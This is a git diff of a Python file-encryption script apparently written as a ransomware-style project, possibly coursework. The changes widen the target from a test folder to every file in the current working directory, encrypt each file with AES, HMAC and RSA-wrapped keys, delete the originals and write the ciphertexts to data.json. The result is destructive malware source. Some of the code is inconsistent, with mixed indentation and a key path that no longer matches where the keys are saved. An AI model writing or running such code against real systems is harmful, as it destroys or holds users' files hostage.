@@ -1,6 +1,7 @@
 #FileEncryptMAC
 #Author: FSociety
 import os
+import json
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding, hashes, hmac
@@ -56,8 +57,8 @@ def MyfileEncryptMAC(filepath):
 	C, IV, tag = MyencryptMAC(message.read(), EncKey, HMACKey) #reads file as a string of bytes
 	message.close
 	ext = Path(filepath).suffix # grabs extension of file
-	input("Press [enter] to select new or existing save location of encyrpted file")
-	WritetoFile(C, None)
+	#input("Press [enter] to select new or existing save location of encyrpted file")
+	#WritetoFile(C, None)
 	return C, IV, EncKey, ext, HMACKey, tag
 
 def Decryptor(IV, EncKey, ext, HMACKey, tag):
@@ -87,18 +88,24 @@ def Decryptor(IV, EncKey, ext, HMACKey, tag):
 	WritetoFile(data, ext) #saves to file
 
 def MyRSAencrypt(filepath, RSA_Publickey_filepath):
-        backend=default_backend()
-        C, IV, EncKey, ext, HMACKey, tag  = MyfileEncryptMAC(filepath)    #encrypts message   
+		backend=default_backend()
+		C, IV, EncKey, ext, HMACKey, tag  = MyfileEncryptMAC(filepath)    #encrypts message   
         
-        RSACipher = public_key.encrypt(         #use RSA encrypt to encrypt the public key
-                EncKey+HMACKey,
-                OAEP(
-                        mgf=MGF1(algorithm=hashes.SHA256()),
-                        algorithm=hashes.SHA256(),
-                        label=None
-                )       
-        )
-        return RSACipher, C, IV, ext, tag
+		with open(RSA_Publickey_filepath, "rb") as key_file: #load public key from file
+			public_key = serialization.load_pem_public_key(
+				key_file.read(),
+				backend = default_backend()
+			)
+			
+		RSACipher = public_key.encrypt(         #use RSA encrypt to encrypt the public key
+				EncKey+HMACKey,
+					OAEP(
+						mgf=MGF1(algorithm=hashes.SHA256()),
+						algorithm=hashes.SHA256(),
+						label=None
+				)       
+		)
+		return RSACipher, C, IV, ext, tag
         
         
 def MyRSAdecrypt (RSACipher, C, IV, ext, RSA_Privatekey_filepath, tag):
@@ -123,23 +130,26 @@ def generate_key_pair():
     public_key = private_key.public_key()   # generate public key
     return public_key, private_key
 
-if(os.path.exists('./public_key.pem') == False):
-    public_key, private_key = generate_key_pair()
+if(os.path.exists('./keys/public_key.pem') == False):
+	public_key, private_key = generate_key_pair()
 
-private_pem = private_key.private_bytes( #Used to create private_key PEM file
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PrivateFormat.TraditionalOpenSSL,
-            encryption_algorithm=serialization.NoEncryption()
-)
-public_pem = public_key.public_bytes( #USed to create public_key PEM file
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PublicFormat.SubjectPublicKeyInfo
-)
-private_file = open ("private_key.pem", "wb") #Writes private_key to file
-private_file.write(private_pem)
-
-public_file = open ("public_key.pem", "wb") #Writes public_key to file
-public_file.write(public_pem)
+	private_pem = private_key.private_bytes( #Used to create private_key PEM file
+				encoding=serialization.Encoding.PEM,
+				format=serialization.PrivateFormat.TraditionalOpenSSL,
+				encryption_algorithm=serialization.NoEncryption()
+	)
+	public_pem = public_key.public_bytes( #USed to create public_key PEM file
+				encoding=serialization.Encoding.PEM,
+				format=serialization.PublicFormat.SubjectPublicKeyInfo
+	)
+	os.makedirs('./keys')
+	private_file = open ("keys/private_key.pem", "wb") #Writes private_key to file
+	private_file.write(private_pem)
+	private_file.close()
+	
+	public_file = open ("keys/public_key.pem", "wb") #Writes public_key to file
+	public_file.write(public_pem)
+	public_file.close()
 
 
 
@@ -152,30 +162,34 @@ public_file.write(public_pem)
 
 #---------------encrypting all files in folder---------------------------
 
-path='./dir_to_encrypt/'
-file_list = os.listdir(path)
-dirLength = len(file_list) #Number of files
-print(file_list)
+file_list = os.listdir()
 js={}
-for x in range (dirLength):
-    RSACipher, C, IV, ext, tag = MyRSAencrypt(path+file_list[x], "public_key.pem")
-    file_name = file_list[x]
-    j = {}
-    js[file_name] = []
-    js[file_name].append({
 
-        "RSACipher": RSACipher.decode('latin-1'),
+if "keys" in file_list:
+	file_list.remove("keys")
 
-        "C": C.decode('latin-1'),
+for file_name in file_list:
+	print("Encrypting " + file_name + "...") 
+	RSACipher, C, IV, ext, tag = MyRSAencrypt(file_name, "public_key.pem")
+	
+	fname = os.path.splitext(str(file_name))[0]
+	j = {}
+	j[fname] = []
+	j[fname].append({
 
-        "IV": IV.decode('latin-1'),
-
-        "Tag": tag.decode('latin-1'),
-
-        "Ext": ext
-        })
-
-    
+		"RSACipher": RSACipher.decode('latin-1'),
+		"C": C.decode('latin-1'),
+		"IV": IV.decode('latin-1'),
+		"ext": ext,
+		"tag": tag.decode('latin-1')
+		})
+	js.update(j)
+	os.remove(file_name)
+	
+with open('data.json', 'w') as outfile:
+	json.dump(js, outfile, indent=4)
+	
+	outfile.close()
 
 
 
